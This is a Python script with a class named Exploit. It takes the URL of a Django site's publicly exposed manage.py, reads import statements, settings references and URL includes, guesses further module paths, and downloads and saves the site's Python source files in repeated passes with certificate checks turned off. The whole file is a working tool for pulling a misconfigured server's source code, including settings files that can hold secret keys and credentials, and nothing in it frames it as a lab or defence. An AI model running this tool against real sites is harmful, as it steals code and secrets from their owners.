#!/usr/bin/python 3.7

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import sys
import logging
import re
import os
from optparse import OptionParser
import random
import time
from urllib.parse import urlparse
from optparse import OptionParser


logger = logging.getLogger(__name__)

# specifies the lowest severity that will be dispatched to the appropriate destination (DEBUG < INFO < WARNING < ERROR < CRITICAL)

logger.setLevel(logging.INFO)

formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')

file_handler = logging.FileHandler('app.log')

file_handler.setFormatter(formatter)

stdout_handler = logging.StreamHandler(sys.stdout)

stdout_handler.setFormatter(formatter)

# add the handlers to the logger

logger.addHandler(file_handler)

logger.addHandler(stdout_handler)


VERBOSE = False

def write_info_log(message):
    if VERBOSE:
        logger.info(message)


class Exploit:
    root_url = None
    data = {}
    should_stop = True
    collected = []
    fullmode = False
    wrote_files_count = 0
    output_dir_name = ''

    uid = 0

    def store(self, path, content, hostname=""):
        try:
            self.output_dir_name = "output-{}-{}/".format(hostname, self.uid)
            dirs = self.output_dir_name + "/".join(path.split("/")[:-1]) + "/"
            os.makedirs(dirs)
        except FileExistsError:
            pass
        with open("{}{}.py".format(self.output_dir_name, path), "w") as f:
            f.write(content)
            self.wrote_files_count += 1

    def collect_src(self, path):
        if path in self.collected:
            return True

        self.collected.append(path)
        url = self.root_url + path + ".py"
        write_info_log("Trying... {}".format(url))
        try:
            r = requests.get(url, timeout=5, verify=False)
            content = r.text
        except Exception as e:
            logger.error("can't request to the file {} e={}".format(url, e))
            content = ""
            
        if r and r.status_code == 200:
            if path not in self.data:
                write_info_log("Found {}.py".format(path))
                self.data[path] = content
                hostname = urlparse(self.root_url).hostname
                self.store(path, content, hostname)
                self.should_stop = False
            return True
        else:
            # print("[e] {} not found".format(path))
            pass
        return False

    def __init__(self, manage_url, fullmode):
        if manage_url.endswith("manage.py"):
            self.uid = int(time.time()) 
            print("[i] UID: {}".format(self.uid))
            self.root_url = manage_url.split("manage.py")[0]
            self.collect_src("manage")
            self.fullmode = fullmode

    def extract_import_lines(self, content):
        content = "\n" + content
        import_lines = []

        SINGLE_FILTER_REGEX = [
            'os.environ.setdefault\((?:.*), \"(.*)\"\)',
            '(?:\n)(?: *)import ([\w|\d|\.|\-]*)',              # import hihi.hoho
            "url\((?:.*)include\('(.*)'\)",
            'url\((?:.*),(?:\ ?)([\w\d\.]*),(?:.*)',
            "'DJANGO_SETTINGS_MODULE', '(.*).settings'"]

        for filter_regex in SINGLE_FILTER_REGEX:
            result = re.findall(filter_regex, content)
            import_lines.extend(result)

        if self.fullmode or "INSTALLED_APPS" in content:
            lines = re.findall("""(?:'|")([^\s]+)(?:'|")""", content)
            import_lines.extend(lines)

        # result = re.findall('(?:\n)(?: *)from (.*) import ( *\((\n *(?:\w|\d)*, *)*\n\) *|(.*))', content)
        result = re.findall('(?:\n)(?:(?: |\t)*)from (.*) import (( |\t)*\((\n( |\t)*(?:\w|\d)*,?( |\t)*)*\n( |\t)*\)( |\t)*|(.*))', content)
        """
        eg:
            from hihi.hoho import ahaha
            from hihi.hoho import (
                Data,
                Services
            )
        """
        for row in result:
            import_lines.append(row[0])
            for element in row[1].split(","):
                element = element.strip()
                import_lines.append(row[0] + "." + element)
        return import_lines

    def get_dir_from_dotpath(self, path):
        dir = "/".join(path.split("/")[:-1])
        if dir != "":
            dir += "/"
        return dir

    def convert_import_line_to_paths(self, current_path, import_line):
        SUPPORT_POSTFIX_LIST = ["/views", "/models", "/urls", "/apps", "/admin", "/tests", "/__init__"]
        paths = []
        if " as " in import_line:
            import_line = import_line.split(" as ")[0]
        import_line = import_line.replace("..", ".")
        if import_line.startswith("."):
            dir_from_dotpath = self.get_dir_from_dotpath(current_path)
            import_line = dir_from_dotpath + import_line[1:]

        path = import_line.replace(".", "/")

        # Append the path
        paths.append(path)
        if path.endswith("/"):
            path = path[:-1]
        for postfix in SUPPORT_POSTFIX_LIST:
            paths.append(path + postfix)

        # Append the parents path
        for i in range(path.count("/")):
            parent_path = "/".join(path.split("/")[:-(i+1)])
            paths.append(parent_path)
            for postfix in SUPPORT_POSTFIX_LIST:
                paths.append(parent_path + postfix)

        return paths

    def loop(self):
        BAD_IMPORT_LINE = ["http://", "https://", " ", "\n", "\t"]
        print("\n---------\nA new loop will be executed now...")
        self.should_stop = True
        # import_lines = []
        old_data = self.data.copy()
        for path, content in old_data.items():
            import_lines = self.extract_import_lines(content)
            for import_line in import_lines:
                continue_flag = False
                for bad in BAD_IMPORT_LINE:
                    if bad in import_line:
                        continue_flag = True
                        break
                if continue_flag:
                    continue
                new_paths = self.convert_import_line_to_paths(current_path=path, import_line=import_line)
                for new_path in new_paths:
                    self.collect_src(path=new_path)
        return not self.should_stop

    def start_crawl(self):
        while self.loop():
            print("[i] Crawled {} files".format(self.wrote_files_count))


if __name__ == '__main__':

    parser = OptionParser()
    parser.add_option("-u", "--url", dest="manage_url",
                      help="working manage.py url")
    parser.add_option("-f", "--fullmode", dest="fullmode",
                      action="store_true",
                      default=False,
                      help="Enable Full Mode")
    parser.add_option("-v", "--verbose", dest="verbose",
                  action="store_true",
                  default=False,
                  help="Enable verbose mode")

    (options, args) = parser.parse_args()

    VERBOSE = options.verbose

    if options.manage_url:
        print("[+] manage.py file: {}".format(options.manage_url))
        if options.fullmode:
            print("[+] Running in Full Mode")
        else:
            print("[+] Running in Quick Mode")

        exploit = Exploit(options.manage_url, options.fullmode)
        exploit.start_crawl()
        print("[+] Done! Please check the {} directory".format(exploit.output_dir_name))
    else:
        print("Manage URL not given")
